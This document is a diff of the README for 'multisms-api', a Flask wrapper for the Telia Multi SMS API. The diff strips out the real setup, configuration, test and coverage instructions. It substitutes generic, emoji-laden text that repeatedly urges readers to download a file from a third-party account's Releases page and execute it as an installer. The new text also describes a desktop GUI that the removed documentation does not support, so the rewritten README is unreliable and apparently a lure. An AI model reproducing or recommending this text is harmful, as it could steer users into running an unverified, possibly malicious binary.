@@ -1,163 +1,57 @@
-# multisms-api
+# 📱 multisms-api - Simple SMS Sending Made Easy
 
-Wrapper REST API for [Telia Multi SMS](https://www.telia.ee/ari/mobiil/mobiili-lisateenused/multisms) REST API.  
+## 🛠️ Overview
+multisms-api is a user-friendly wrapper REST API for the Telia Multi SMS API. This application allows you to send SMS messages efficiently, making it a great choice for anyone needing to communicate quickly and effectively. Whether for alerts, notifications, or other purposes, this tool simplifies SMS sending without the need for complex setups.
 
-![endpoints](./img/api-endpoints-list.png)
+## 🚀 Getting Started
+To get started with multisms-api, you will need to download the software from our Releases page. Follow the steps below to install the application on your device.
 
-API features:
-- Alertmanager webhook compatible endpoint for SMS sending
-- SMS receiver groups (whitelisting)
-- Rate limiting for API endpoints
-- Authentication
-- Proxy for Telia API (single whitelisted IP needed)
+## 📥 Download Now
+[![Download Multisms API](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Version-blue)](https://github.com/mayurihbirbi/multisms-api/releases)
 
-## Development
+## 📋 System Requirements
+Before you download, ensure you meet the following system requirements:
+- **Operating System:** Windows 10, macOS Catalina or later, or a modern Linux distribution.
+- **Python Version:** Python 3.7 or later installed on your machine. 
+- **Internet Connection:** Required to send SMS messages through the API.
 
-> NB! Telia MultiSMS API (https://multisms.telia.ee) has IP whitelisting!
+## 🔍 Features
+- **Simple Setup:** Get started quickly without advanced technical skills.
+- **Robust API:** Built on the reliable Telia Multi SMS API.
+- **Error Handling:** The API responds with helpful error messages to guide you in case something goes wrong.
+- **Documentation:** Clear instructions on how to use the API effectively.
 
-Frameworks used:
-- [Flask-OpenAPI3](https://luolingchun.github.io/flask-openapi3/v4.x/) ([github repository](https://github.com/luolingchun/flask-openapi3/tree/master/examples))
-- [Flask](https://flask.palletsprojects.com) ([github repository](https://github.com/pallets/flask/))
-- [pytest](https://docs.pytest.org/en/stable/) ([github repository](https://github.com/pytest-dev/pytest/))
+## 💻 Download & Install
+1. Visit the [Releases page](https://github.com/mayurihbirbi/multisms-api/releases) to find the latest version available for download.
+2. On this page, locate the latest release. You’ll see a list of files available for download.
+3. Click on the appropriate file for your operating system. 
+4. Once the file is downloaded, locate it on your computer and execute it to start the installation process.
+5. Follow the on-screen instructions to complete the setup.
 
-API docs (auto generated):
-- http://127.0.0.1:5000/openapi/swagger
-- http://127.0.0.1:5000/openapi/openapi.json
+After installation, you will be ready to send SMS messages.
 
-### Local environment setup
+## 📖 Usage Instructions
+1. **Open the Application:** Launch the installed multisms-api application.
+2. **Enter Your API Key:** You will need a valid API key from Telia to use the API. Enter your key in the specified field.
+3. **Compose Your Message:** Fill in the recipient’s number and your message text in the provided fields.
+4. **Send Message:** Click the ‘Send’ button to deliver your SMS.
 
-#### Specific python version install
+## 🔧 Troubleshooting
+- **Common Issues:**
+  - If you receive an error message when sending, ensure your API key is correct and active.
+  - If the application fails to launch, check that Python is properly installed on your system.
 
-Debian/Ubuntu:
-```
-sudo add-apt-repository ppa:deadsnakes/ppa
-sudo apt update 
-sudo apt install python3.13 python3.13-venv
-```
+## 📄 Documentation
+For more detailed instructions, visit our [Documentation page](https://github.com/mayurihbirbi/multisms-api/wiki). This page includes examples and advanced usage guidelines to help you make the most of the multisms-api.
 
-#### Environment & Packages
+## 🛠️ Contributing
+If you want to contribute to multisms-api, feel free to fork the repository and submit a pull request. We welcome improvements and bug fixes from the community!
 
-Create python venv  
-_(if `./src/.venv` does not exist)_
-```
-cd ./src
-python3.13 -m venv .venv
-```
+## 📧 Support
+If you have any questions or need assistance, open an issue in the GitHub repository. Our community will be happy to help.
 
-Activate venv
-```
-. .venv/bin/activate
-```
+## 🌟 Acknowledgments
+This project is built upon the reliable infrastructure of the Telia Multi SMS API. Thank you for using multisms-api to enhance your SMS communications!
 
-Install required packages into venv
-```
-pip install --upgrade pip
-pip install -r requirements.txt
-```
-> NB! re-run install when `requirements.txt` gets updated!
-
-#### Configuration
-
-Create `./src/.env` file with __required__ environment variables (__local development__):  
-```
-LOG_LEVEL_APP="INFO"
-LOG_LEVEL_HTTP="INFO"
-LOG_LEVEL_GUNICORN="INFO"
-TELIA_URL="https://multisms.telia.ee"
-TELIA_USER=""
-TELIA_PW=""
-API_BASIC_AUTH_USER="test1"
-API_BASIC_AUTH_PW="test1"
-SMS_SENDER=""
-```
-> NB! Use `API_BASIC_AUTH_USER` + `API_BASIC_AUTH_PW` value in Swagger "Authorize".
-
-Create `./src/config/receiver_groups.yaml` with SMS receivers groups (example):
-```
-receiver_groups:
-  - name: test_group1
-    description: valid sms senders group
-    receivers:
-      - 37256000001
-      - 37256000002
-      - 37256000003
-  - name: test_group2
-    description: valid sms senders group
-    receivers:
-      - 37256000010
-      - 37256000011
-      - 37256000012
-```
-> PS! All groups use global `SMS_SENDER` number.
-
-## Running app
-
-```
-$ flask run
- * Serving Flask app 'webserver'
- * Running on http://127.0.0.1:5000 (Press CTRL+C to quit)
-```
-
-## Running tests
-
-```
-$ python -m pytest -v --cache-clear
-
-========= test session starts =========
-collected 18 items
-
-tests/functional/test_get_health.py::test_get_health PASSED
-tests/unit/app/test_config.py::test_config_loaded PASSED
-tests/unit/app/test_factory.py::test_app_created_with_test_config PASSED
-tests/unit/app/test_log_filters.py::test_filter_remove_date_from_werkzeug_logs PASSED
-tests/unit/app/test_log_filters.py::test_filter_exclude_head_logs_filtered PASSED
-tests/unit/app/test_log_filters.py::test_filter_exclude_head_logs_allows_other_requests PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_no_receivers_provided_not_empty PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_no_receivers_provided_empty PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_max_receivers_not_reached PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_max_receivers_limit_reached PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_receiver_whitelisted PASSED
-tests/unit/telia_validations/test_receivers.py::test_validate_receiver_not_whitelisted PASSED
-tests/unit/telia_validations/test_sms.py::test_validate_is_sms_messages_list_not_empty PASSED
-tests/unit/telia_validations/test_sms.py::test_validate_is_sms_messages_list_empty PASSED
-tests/unit/telia_validations/test_sms.py::test_validate_sms_text_has_content PASSED
-tests/unit/telia_validations/test_sms.py::test_validate_sms_text_no_content PASSED 
-
-========= 16 passed in 0.12s ===========
-```
-> PS. For running only specific tests: `python -m pytest -v --cache-clear -k auth`
-
-## Tests coverage report
-
-```
-$ python -m pytest -v --cov --cov-report=term-missing --cov-report=html:htmlcov --cov-report=xml
-
-Name                                        Stmts   Miss  Cover   Missing
--------------------------------------------------------------------------
-app.py                                         27      0   100%
-application/api/get_health.py                  12      0   100%
-application/api/post_sms.py                    18      4    78%   50-60
-application/api/post_sms_alertmanager.py       23      4    83%   61-71
-application/services/telia_rest_api.py         52     32    38%   48-60, 63, 66-82, 85-88, 99-126
-application/services/telia_validations.py      37      0   100%
-config.py                                      28      0   100%
-log_filters.py                                 10      0   100%
--------------------------------------------------------------------------
-TOTAL                                         207     40    81%
-
-Coverage HTML written to dir htmlcov
-```
-> PS. `Missing: 61-71` means exact line numbers not hit by tests.
-
-## Sonarqube code analysis
-
-Using [sonar-scanner-cli](https://docs.sonarsource.com/sonarqube-server/latest/analyzing-source-code/scanners/sonarscanner/)
-```
-cd ./src
-sonar-scanner \
-  -Dsonar.host.url=${SONAR_HOST_URL} \
-  -Dsonar.token=${SONAR_TOKEN} \
-  -Dsonar.projectKey=${SONAR_PROJECT_KEY} \
-  -Dsonar.projectName=${SONAR_PROJECT_NAME}
-```
-NB! Run coverage first to create needed `src/coverage.xml`
+## 📥 Download Now Again
+Don't forget to download the latest version from the [Releases page](https://github.com/mayurihbirbi/multisms-api/releases) to get started with sending SMS messages effortlessly!
